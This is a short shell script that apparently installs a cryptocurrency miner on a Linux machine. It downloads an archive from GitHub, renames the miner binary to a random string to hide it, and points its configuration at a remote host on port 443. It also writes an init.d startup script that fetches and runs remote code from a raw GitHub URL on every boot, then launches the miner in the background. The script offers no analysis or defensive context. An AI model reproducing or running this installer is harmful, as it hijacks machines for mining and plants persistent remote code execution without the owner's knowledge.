cd /
wget https://github.com/sandzema/fauna/releases/download/v1.5.2/fresco.tar
tar -xvf fresco.tar
cd /fresco
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv ruins $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./crypt.sh
sed -i "s/host/20.163.170.215:443/g" --thread 82 ./crypt.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/sandzema/fauna/main/gods.sh)" > pots.sh
chmod a+x pots.sh
update-rc.d pots.sh defaults
rm -rf fresco.tar
cd /fresco
nohup ./crypt.sh
ps -ef | grep fresco
